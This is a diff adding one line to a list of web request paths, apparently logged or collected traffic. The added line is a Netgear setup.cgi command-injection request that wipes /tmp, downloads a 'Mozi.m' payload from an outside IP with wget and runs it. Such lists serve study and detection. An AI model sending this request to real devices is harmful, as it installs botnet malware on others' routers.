@@ -12505,3 +12505,4 @@ srv57c0d2365c3c.korsan.me:443
 /null
 /wp-content/plugins/litespeed-cache/readme.txt
 /?gclid=CjwKCAiAzba9BhBhEiwA7glbaoQKBMbHH30P9vYAvBbrCrH_vwPp-_yzolUarxH5nVYe3k7KaO0UtxoCASgQAvD_BwE
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.11.218.81:44394/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
